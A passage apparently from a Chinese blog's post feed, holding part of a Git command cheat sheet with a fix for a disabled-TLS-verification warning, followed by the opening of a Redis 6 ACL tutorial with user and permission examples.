<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 显示当前的Git配置</span>
$ <span class="token function">git</span> config <span class="token parameter variable">--list</span>

<span class="token comment"># 编辑Git配置文件</span>
$ <span class="token function">git</span> config <span class="token parameter variable">-e</span> <span class="token punctuation">[</span>--global<span class="token punctuation">]</span>

<span class="token comment"># 设置提交代码时的用户信息</span>
$ <span class="token function">git</span> config <span class="token punctuation">[</span>--global<span class="token punctuation">]</span> user.name <span class="token string">"[name]"</span>
$ <span class="token function">git</span> config <span class="token punctuation">[</span>--global<span class="token punctuation">]</span> user.email <span class="token string">"[email address]"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="四、增加-删除文件">四、增加/删除文件</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 添加指定文件到暂存区</span>
$ <span class="token function">git</span> <span class="token function">add</span> <span class="token punctuation">[</span>file1<span class="token punctuation">]</span> <span class="token punctuation">[</span>file2<span class="token punctuation">]</span> <span class="token punctuation">..</span>.

<span class="token comment"># 添加指定目录到暂存区，包括子目录</span>
$ <span class="token function">git</span> <span class="token function">add</span> <span class="token punctuation">[</span>dir<span class="token punctuation">]</span>

<span class="token comment"># 添加当前目录的所有文件到暂存区</span>
$ <span class="token function">git</span> <span class="token function">add</span> <span class="token builtin class-name">.</span>

<span class="token comment"># 添加每个变化前，都会要求确认</span>
<span class="token comment"># 对于同一个文件的多处变化，可以实现分次提交</span>
$ <span class="token function">git</span> <span class="token function">add</span> <span class="token parameter variable">-p</span>

<span class="token comment"># 删除工作区文件，并且将这次删除放入暂存区</span>
$ <span class="token function">git</span> <span class="token function">rm</span> <span class="token punctuation">[</span>file1<span class="token punctuation">]</span> <span class="token punctuation">[</span>file2<span class="token punctuation">]</span> <span class="token punctuation">..</span>.

<span class="token comment"># 停止追踪指定文件，但该文件会保留在工作区</span>
$ <span class="token function">git</span> <span class="token function">rm</span> <span class="token parameter variable">--cached</span> <span class="token punctuation">[</span>file<span class="token punctuation">]</span>

<span class="token comment"># 改名文件，并且将这个改名放入暂存区</span>
$ <span class="token function">git</span> <span class="token function">mv</span> <span class="token punctuation">[</span>file-original<span class="token punctuation">]</span> <span class="token punctuation">[</span>file-renamed<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="五、代码提交">五、代码提交</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 提交暂存区到仓库区</span>
$ <span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token punctuation">[</span>message<span class="token punctuation">]</span>

<span class="token comment"># 提交暂存区的指定文件到仓库区</span>
$ <span class="token function">git</span> commit <span class="token punctuation">[</span>file1<span class="token punctuation">]</span> <span class="token punctuation">[</span>file2<span class="token punctuation">]</span> <span class="token punctuation">..</span>. <span class="token parameter variable">-m</span> <span class="token punctuation">[</span>message<span class="token punctuation">]</span>

<span class="token comment"># 提交工作区自上次commit之后的变化，直接到仓库区</span>
$ <span class="token function">git</span> commit <span class="token parameter variable">-a</span>

<span class="token comment"># 提交时显示所有diff信息</span>
$ <span class="token function">git</span> commit <span class="token parameter variable">-v</span>

<span class="token comment"># 使用一次新的commit，替代上一次提交</span>
<span class="token comment"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span>
$ <span class="token function">git</span> commit <span class="token parameter variable">--amend</span> <span class="token parameter variable">-m</span> <span class="token punctuation">[</span>message<span class="token punctuation">]</span>

<span class="token comment"># 重做上一次commit，并包括指定文件的新变化</span>
$ <span class="token function">git</span> commit <span class="token parameter variable">--amend</span> <span class="token punctuation">[</span>file1<span class="token punctuation">]</span> <span class="token punctuation">[</span>file2<span class="token punctuation">]</span> <span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="六、分支">六、分支</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 列出所有本地分支</span>
$ <span class="token function">git</span> branch

<span class="token comment"># 列出所有远程分支</span>
$ <span class="token function">git</span> branch <span class="token parameter variable">-r</span>

<span class="token comment"># 列出所有本地分支和远程分支</span>
$ <span class="token function">git</span> branch <span class="token parameter variable">-a</span>

<span class="token comment"># 新建一个分支，但依然停留在当前分支</span>
$ <span class="token function">git</span> branch <span class="token punctuation">[</span>branch-name<span class="token punctuation">]</span>

<span class="token comment"># 新建一个分支，并切换到该分支</span>
$ <span class="token function">git</span> checkout <span class="token parameter variable">-b</span> <span class="token punctuation">[</span>branch<span class="token punctuation">]</span>

<span class="token comment"># 新建一个分支，指向指定commit</span>
$ <span class="token function">git</span> branch <span class="token punctuation">[</span>branch<span class="token punctuation">]</span> <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>

<span class="token comment"># 新建一个分支，与指定的远程分支建立追踪关系</span>
$ <span class="token function">git</span> branch <span class="token parameter variable">--track</span> <span class="token punctuation">[</span>branch<span class="token punctuation">]</span> <span class="token punctuation">[</span>remote-branch<span class="token punctuation">]</span>

<span class="token comment"># 切换到指定分支，并更新工作区</span>
$ <span class="token function">git</span> checkout <span class="token punctuation">[</span>branch-name<span class="token punctuation">]</span>

<span class="token comment"># 切换到上一个分支</span>
$ <span class="token function">git</span> checkout -

<span class="token comment"># 建立追踪关系，在现有分支与指定的远程分支之间</span>
$ <span class="token function">git</span> branch --set-upstream <span class="token punctuation">[</span>branch<span class="token punctuation">]</span> <span class="token punctuation">[</span>remote-branch<span class="token punctuation">]</span>

<span class="token comment"># 合并指定分支到当前分支</span>
$ <span class="token function">git</span> merge <span class="token punctuation">[</span>branch<span class="token punctuation">]</span>

<span class="token comment"># 选择一个commit，合并进当前分支</span>
$ <span class="token function">git</span> cherry-pick <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>

<span class="token comment"># 删除分支</span>
$ <span class="token function">git</span> branch <span class="token parameter variable">-d</span> <span class="token punctuation">[</span>branch-name<span class="token punctuation">]</span>

<span class="token comment"># 删除远程分支</span>
$ <span class="token function">git</span> push origin <span class="token parameter variable">--delete</span> <span class="token punctuation">[</span>branch-name<span class="token punctuation">]</span>
$ <span class="token function">git</span> branch <span class="token parameter variable">-dr</span> <span class="token punctuation">[</span>remote/branch<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="七、标签">七、标签</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 列出所有tag</span>
$ <span class="token function">git</span> tag

<span class="token comment"># 新建一个tag在当前commit</span>
$ <span class="token function">git</span> tag <span class="token punctuation">[</span>tag<span class="token punctuation">]</span>

<span class="token comment"># 新建一个tag在指定commit</span>
$ <span class="token function">git</span> tag <span class="token punctuation">[</span>tag<span class="token punctuation">]</span> <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>

<span class="token comment"># 删除本地tag</span>
$ <span class="token function">git</span> tag <span class="token parameter variable">-d</span> <span class="token punctuation">[</span>tag<span class="token punctuation">]</span>

<span class="token comment"># 删除远程tag</span>
$ <span class="token function">git</span> push origin :refs/tags/<span class="token punctuation">[</span>tagName<span class="token punctuation">]</span>

<span class="token comment"># 查看tag信息</span>
$ <span class="token function">git</span> show <span class="token punctuation">[</span>tag<span class="token punctuation">]</span>

<span class="token comment"># 提交指定tag</span>
$ <span class="token function">git</span> push <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> <span class="token punctuation">[</span>tag<span class="token punctuation">]</span>

<span class="token comment"># 提交所有tag</span>
$ <span class="token function">git</span> push <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> <span class="token parameter variable">--tags</span>

<span class="token comment"># 新建一个分支，指向某个tag</span>
$ <span class="token function">git</span> checkout <span class="token parameter variable">-b</span> <span class="token punctuation">[</span>branch<span class="token punctuation">]</span> <span class="token punctuation">[</span>tag<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="八、查看信息">八、查看信息</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 显示有变更的文件</span>
$ <span class="token function">git</span> status

<span class="token comment"># 显示当前分支的版本历史</span>
$ <span class="token function">git</span> log

<span class="token comment"># 显示commit历史，以及每次commit发生变更的文件</span>
$ <span class="token function">git</span> log <span class="token parameter variable">--stat</span>

<span class="token comment"># 搜索提交历史，根据关键词</span>
$ <span class="token function">git</span> log <span class="token parameter variable">-S</span> <span class="token punctuation">[</span>keyword<span class="token punctuation">]</span>

<span class="token comment"># 显示某个commit之后的所有变动，每个commit占据一行</span>
$ <span class="token function">git</span> log <span class="token punctuation">[</span>tag<span class="token punctuation">]</span> HEAD <span class="token parameter variable">--pretty</span><span class="token operator">=</span>format:%s

<span class="token comment"># 显示某个commit之后的所有变动，其"提交说明"必须符合搜索条件</span>
$ <span class="token function">git</span> log <span class="token punctuation">[</span>tag<span class="token punctuation">]</span> HEAD <span class="token parameter variable">--grep</span> feature

<span class="token comment"># 显示某个文件的版本历史，包括文件改名</span>
$ <span class="token function">git</span> log <span class="token parameter variable">--follow</span> <span class="token punctuation">[</span>file<span class="token punctuation">]</span>
$ <span class="token function">git</span> whatchanged <span class="token punctuation">[</span>file<span class="token punctuation">]</span>

<span class="token comment"># 显示指定文件相关的每一次diff</span>
$ <span class="token function">git</span> log <span class="token parameter variable">-p</span> <span class="token punctuation">[</span>file<span class="token punctuation">]</span>

<span class="token comment"># 显示过去5次提交</span>
$ <span class="token function">git</span> log <span class="token parameter variable">-5</span> <span class="token parameter variable">--pretty</span> <span class="token parameter variable">--oneline</span>

<span class="token comment"># 显示所有提交过的用户，按提交次数排序</span>
$ <span class="token function">git</span> shortlog <span class="token parameter variable">-sn</span>

<span class="token comment"># 显示指定文件是什么人在什么时间修改过</span>
$ <span class="token function">git</span> blame <span class="token punctuation">[</span>file<span class="token punctuation">]</span>

<span class="token comment"># 显示暂存区和工作区的差异</span>
$ <span class="token function">git</span> <span class="token function">diff</span>

<span class="token comment"># 显示暂存区和上一个commit的差异</span>
$ <span class="token function">git</span> <span class="token function">diff</span> <span class="token parameter variable">--cached</span> <span class="token punctuation">[</span>file<span class="token punctuation">]</span>

<span class="token comment"># 显示工作区与当前分支最新commit之间的差异</span>
$ <span class="token function">git</span> <span class="token function">diff</span> HEAD

<span class="token comment"># 显示两次提交之间的差异</span>
$ <span class="token function">git</span> <span class="token function">diff</span> <span class="token punctuation">[</span>first-branch<span class="token punctuation">]</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>second-branch<span class="token punctuation">]</span>

<span class="token comment"># 显示今天你写了多少行代码</span>
$ <span class="token function">git</span> <span class="token function">diff</span> <span class="token parameter variable">--shortstat</span> <span class="token string">"@{0 day ago}"</span>

<span class="token comment"># 显示某次提交的元数据和内容变化</span>
$ <span class="token function">git</span> show <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>

<span class="token comment"># 显示某次提交发生变化的文件</span>
$ <span class="token function">git</span> show --name-only <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>

<span class="token comment"># 显示某次提交时，某个文件的内容</span>
$ <span class="token function">git</span> show <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>:<span class="token punctuation">[</span>filename<span class="token punctuation">]</span>

<span class="token comment"># 显示当前分支的最近几次提交</span>
$ <span class="token function">git</span> reflog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="九、远程同步">九、远程同步</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 下载远程仓库的所有变动</span>
$ <span class="token function">git</span> fetch <span class="token punctuation">[</span>remote<span class="token punctuation">]</span>

<span class="token comment"># 显示所有远程仓库</span>
$ <span class="token function">git</span> remote <span class="token parameter variable">-v</span>

<span class="token comment"># 显示某个远程仓库的信息</span>
$ <span class="token function">git</span> remote show <span class="token punctuation">[</span>remote<span class="token punctuation">]</span>

<span class="token comment"># 增加一个新的远程仓库，并命名</span>
$ <span class="token function">git</span> remote <span class="token function">add</span> <span class="token punctuation">[</span>shortname<span class="token punctuation">]</span> <span class="token punctuation">[</span>url<span class="token punctuation">]</span>

<span class="token comment"># 取回远程仓库的变化，并与本地分支合并</span>
$ <span class="token function">git</span> pull <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> <span class="token punctuation">[</span>branch<span class="token punctuation">]</span>

<span class="token comment"># 上传本地指定分支到远程仓库</span>
$ <span class="token function">git</span> push <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> <span class="token punctuation">[</span>branch<span class="token punctuation">]</span>

<span class="token comment"># 强行推送当前分支到远程仓库，即使有冲突</span>
$ <span class="token function">git</span> push <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> <span class="token parameter variable">--force</span>

<span class="token comment"># 推送所有分支到远程仓库</span>
$ <span class="token function">git</span> push <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> <span class="token parameter variable">--all</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="十、撤销">十、撤销</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 恢复暂存区的指定文件到工作区</span>
$ <span class="token function">git</span> checkout <span class="token punctuation">[</span>file<span class="token punctuation">]</span>

<span class="token comment"># 恢复某个commit的指定文件到暂存区和工作区</span>
$ <span class="token function">git</span> checkout <span class="token punctuation">[</span>commit<span class="token punctuation">]</span> <span class="token punctuation">[</span>file<span class="token punctuation">]</span>

<span class="token comment"># 恢复暂存区的所有文件到工作区</span>
$ <span class="token function">git</span> checkout <span class="token builtin class-name">.</span>

<span class="token comment"># 撤销git add</span>
<span class="token comment"># 如果是撤销所有的已经add的文件:  </span>
<span class="token function">git</span> reset HEAD <span class="token builtin class-name">.</span>
<span class="token comment"># 如果是撤销某个文件或文件夹（filename：文件名或者文件夹名）</span>
<span class="token function">git</span> reset HEAD <span class="token parameter variable">-filename</span>

<span class="token comment"># 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变</span>
$ <span class="token function">git</span> reset <span class="token punctuation">[</span>file<span class="token punctuation">]</span>

<span class="token comment"># 重置暂存区与工作区，与上一次commit保持一致</span>
$ <span class="token function">git</span> reset <span class="token parameter variable">--hard</span>

<span class="token comment"># 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变</span>
$ <span class="token function">git</span> reset <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>

<span class="token comment"># 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致</span>
$ <span class="token function">git</span> reset <span class="token parameter variable">--hard</span> <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>

<span class="token comment"># 重置当前HEAD为指定commit，但保持暂存区和工作区不变</span>
$ <span class="token function">git</span> reset <span class="token parameter variable">--keep</span> <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>

<span class="token comment"># 新建一个commit，用来撤销指定commit</span>
<span class="token comment"># 后者的所有变化都将被前者抵消，并且应用到当前分支</span>
$ <span class="token function">git</span> revert <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>

<span class="token comment"># 暂时将未提交的变化移除，稍后再移入</span>
$ <span class="token function">git</span> stash
$ <span class="token function">git</span> stash pop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="十一、其他">十一、其他</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 生成一个可供发布的压缩包</span>
$ <span class="token function">git</span> archive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h1>给本地分支添加备注信息</h1>
<h2 id="安装全局插件">安装全局插件</h2>
<pre class="line-numbers language-bat" data-language="bat"><code class="language-bat">npm i -g git-br<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="查看备注信息（安装插件）">查看备注信息（安装插件）</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">git-br<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="查看信息（未安装插件）">查看信息（未安装插件）</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config branch.feature_20150713_hd-123.description<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="给分支添加备注">给分支添加备注</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config branch.feature_20150713_hd-123.description 海南放款<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>问题记录</h1>
<h2 id="SECURITY-WARNING">SECURITY WARNING</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">git</span> pull
warning: ----------------- SECURITY WARNING ----------------
warning: <span class="token operator">|</span> TLS certificate verification has been disabled<span class="token operator">!</span> <span class="token operator">|</span>
warning: ---------------------------------------------------
warning: HTTPS connections may not be secure. See https://aka.ms/gcm/tlsverify <span class="token keyword">for</span> <span class="token function">more</span> information.
warning: ----------------- SECURITY WARNING ----------------
warning: <span class="token operator">|</span> TLS certificate verification has been disabled<span class="token operator">!</span> <span class="token operator">|</span>
warning: ---------------------------------------------------
warning: HTTPS connections may not be secure. See https://aka.ms/gcm/tlsverify <span class="token keyword">for</span> <span class="token function">more</span> information.
warning: ----------------- SECURITY WARNING ----------------
warning: <span class="token operator">|</span> TLS certificate verification has been disabled<span class="token operator">!</span> <span class="token operator">|</span>
warning: ---------------------------------------------------
warning: HTTPS connections may not be secure. See https://aka.ms/gcm/tlsverify <span class="token keyword">for</span> <span class="token function">more</span> information.
warning: fetch updated the current branch head. 
fast-forwarding your working tree from
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>解决</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> http.sslVerify <span class="token boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-ACL</title>
    <url>/20230210/4be8fe93.html</url>
    <content><![CDATA[<h1>前言</h1>
<p>在 Redis6.0中引入了ACL（Access Control List) 的支持，可以给每个用户分配不同的权限来控制权限。</p>
<p>Redis AUTH命令在Redis 6中进行了扩展，所以现在可以以双参数形式使用它:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">AUTH <span class="token operator">&lt;</span>username<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>password<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里有一个旧形式的例子</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">AUTH <span class="token operator">&lt;</span>password<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>所发生的情况是，用于身份验证的用户名是“default”，因此仅指定密码就意味着我们希望根据默认用户进行身份验证。这提供了向后兼容性。</p>
<p>如果该用户具有 <code>nopass</code>规则，那么新的连接将立即作为“默认”用户进行身份验证，而不需要通过AUTH命令提供任何密码。</p>
<p>如果“默认”用户没有标记为<code>nopass</code>，则连接将在未验证的状态下启动，并将需要AUTH(或HELLO命令AUTH选项)才能进行身份验证并开始工作。</p>
<h1>使用场景</h1>
<ol>
<li>您希望通过限制对命令和密钥的访问来提高安全性，这样不受信任的客户机就没有访问权限，而受信任的客户机只有执行所需工作所需的最低级别的数据库访问权限。例如，某些客户端可能只能执行只读命令。</li>
<li>您希望提高操作安全性，以便访问Redis的进程或人员不允许由于软件错误或手动错误而损坏数据或配置。例如，从Redis获取延迟作业的worker没有理由能够调用FLUSHALL命令。</li>
</ol>
<h1>配置ACL</h1>
<p>Redis ACL用户的定义格式如下: <code>user &lt;username&gt; ... acl rules ...</code> 如<code> worker +@list +@connection ~jobs:* on &gt;ffa9203c493aa99</code></p>
<p>默认情况下，只定义了一个名为default的用户。我们可以使用ACL LIST命令来检查当前活动的ACL，并验证一个新启动的、默认配置的Redis实例的配置是什么:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> ACL LIST
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"user default on nopass ~* &amp;* +@all"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>每行的前两个单词是“user”，后面跟着用户名。下一个单词是描述不同事物的ACL规则。我们将详细说明这些规则是如何工作的，但现在只需要说明默认用户被配置为活动(on)，不需要密码(nopass)，可以访问每个可能的密钥(~<em>)和发布/订阅通道(&amp;</em>)，并且能够调用每个可能的命令(+@all)。</p>
<p>此外，在默认用户的特殊情况下，使用<code>nopass</code>规则意味着新连接将自动使用默认用户进行身份验证，而不需要任何显式的AUTH调用。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> ACL SETUSER alice
OK
<span class="token operator">&gt;</span> ACL LIST
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"user alice off resetchannels -@all"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"user default on nopass ~* &amp;* +@all"</span>


<span class="token comment"># 这样的用户完全没用。让我们尝试定义用户，使其处于活动状态，具有密码，并且只能使用GET命令访问以字符串“cached:”开头的键名。</span>
<span class="token operator">&gt;</span> ACL SETUSER alice on <span class="token operator">&gt;</span>p1pp0 ~cached:* +get
OK
<span class="token operator">&gt;</span> AUTH alice p1pp0
OK
<span class="token operator">&gt;</span> GET foo
<span class="token punctuation">(</span>error<span class="token punctuation">)</span> NOPERM this user has no permissions to access one of the keys used as arguments
<span class="token operator">&gt;</span> GET cached:1234
<span class="token punctuation">(</span>nil<span class="token punctuation">)</span>
<span class="token operator">&gt;</span> SET cached:1234 zap
<span class="token punctuation">(</span>error<span class="token punctuation">)</span> NOPERM this user has no permissions to run the <span class="token string">'set'</span> <span class="token builtin class-name">command</span>

<span class="token comment"># ACL GETUSER 是 ACL LIST的替代方案，方便阅读</span>
<span class="token operator">&gt;</span> ACL GETUSER alice
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"flags"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"on"</span>
<span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"passwords"</span>
<span class="token number">4</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"2d9c75..."</span>
<span class="token number">5</span><span class="token punctuation">)</span> <span class="token string">"commands"</span>
<span class="token number">6</span><span class="token punctuation">)</span> <span class="token string">"-@all +get"</span>
<span class="token number">7</span><span class="token punctuation">)</span> <span class="token string">"keys"</span>
<span class="token number">8</span><span class="token punctuation">)</span> <span class="token string">"~cached:*"</span>
<span class="token number">9</span><span class="token punctuation">)</span> <span class="token string">"channels"</span>
<span class="token number">10</span><span class="token punctuation">)</span> <span class="token string">""</span>
<span class="token number">11</span><span class="token punctuation">)</span> <span class="token string">"selectors"</span>
<span class="token number">12</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>empty array<span class="token punctuation">)</span>

<span class="token comment"># 使用另一个ACL SETUSER命令(来自不同的用户，因为alice不能运行ACL命令)，我们可以向用户添加多个模式:</span>
<span class="token operator">&gt;</span> ACL SETUSER alice ~objects:* ~items:* ~public:*
OK
<span class="token operator">&gt;</span> ACL LIST
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"user alice on #2d9c75... ~cached:* ~objects:* ~items:* ~public:* resetchannels -@all +get"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"user default on nopass ~* &amp;* +@all"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>ACL规则</h1>
<p>ACL规则可以以任意顺序指定：例如，可以从密码开始，然后是标志或密钥模式。但是请注意，加法和减法规则将根据顺序改变含义。</p>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment"># 例如，请看下面的例子:</span>
<span class="token comment">#</span>
<span class="token comment">#   user alice on +@all -DEBUG ~* &gt;somepassword</span>
<span class="token comment">#</span>
<span class="token comment"># 这将允许“alice”使用除DEBUG命令之外的所有命令,因为 +@all将所有命令添加到alice可以使用的命令集，后来DEBUG被删除。</span>
<span class="token comment"># 然而，如果我们颠倒两个ACL规则的顺序，结果将是不同的:</span>
<span class="token comment">#</span>
<span class="token comment">#   user alice on -DEBUG +@all ~* &gt;somepassword</span>
<span class="token comment">#</span>
<span class="token comment"># 现在，当alice在允许的命令集中还没有命令时，DEBUG被删除，之后所有的命令都被添加，所以用户将能够执行所有的命令。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>基本上ACL规则是从左到右处理的。</p>
<p>下面是有效的ACL规则列表。某些规则只是单个单词，用于激活或删除标志，或执行对用户ACL的给定更改。其他规则是与命令或类别名称、键模式等连接在一起的字符前缀。</p>
<ul>
<li>
<p>启用和禁用用户</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>on</td>
<td>启用用户：可以作为该用户进行身份验证。</td>
</tr>
<tr>
<td>off</td>
<td>禁止该用户：不再可能对该用户进行身份验证；但是，以前经过身份验证的连接仍然可以工作。<br>注意，如果默认用户被标记为关闭，那么新的连接将作为未验证启动，并且将要求用户发送带有AUTH选项的AUTH或HELLO，以便以某种方式进行身份验证，而不管默认用户配置如何。</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</li>
<li>
<p>allow和disallow命令</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
</table>
</li>
</ul>
<p>|+<command> | 将该命令添加到用户可以调用的命令列表中。可以与<code>|</code>一起使用以允许子命令（例如<code>+config|get</code>)。 |<br>
| -<command> | 将该命令移到用户可以调用的命令列表中。从Redis 7.0开始，它可以与<code>|</code>一起用于阻塞子命令（例如<code>+config|get</code>)。 |<br>
| +@<category> | 添加该类别中所有用户调用的命令，有效类别为@admin， @set， @sortedset，…诸如此类， <code>ACL CAT </code>命令查看完整的列表。<br>特殊类别@all表示所有命令，包括当前存在于服务器中的命令，以及将来将通过模块加载的命令。 |<br>
| -@<category> | 类似<code> +@&lt;category&gt;</code> 但是从客户端可以调用的命令列表中删除命令。 |<br>
| +<command>|first-arg（弃用） | 允许在其他情况下禁用命令的特定第一个参数<br>它只支持没有子命令的命令，并且不允许作为<code>-SELECT|1</code>这样的负形式，只支持以<code>+</code>开头的加法。 |<br>
| allcommands | <code> +@all</code>另外一种书写形式.  注意，它意味着能够执行通过模块系统加载的所有未来命令。 |<br>
| nocommands | <code> -@all</code>另外一种书写形式 |</command></category></category></command></command></p>
<ul>
<li>
<p>允许和禁止某些密钥和密钥权限</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>~<pattern></pattern></td>
<td>可以作为命令的一部分, 添加一个键的模式 <br>例如<code>~*</code> 允许所有的键 。该模式是一个全局样式的模式，类似于KEYS的模式。可以指定多个模式。</td>
</tr>
<tr>
<td>%R~<pattern></pattern></td>
<td>(版本<code>7.0</code>之后)  添加键读取模式，指定可以从哪些键读取。<br>它的行为类似于常规键模式，但只授予从匹配给定模式的键读取的权限. <br>有关更多信息，请参阅关键权限。</td>
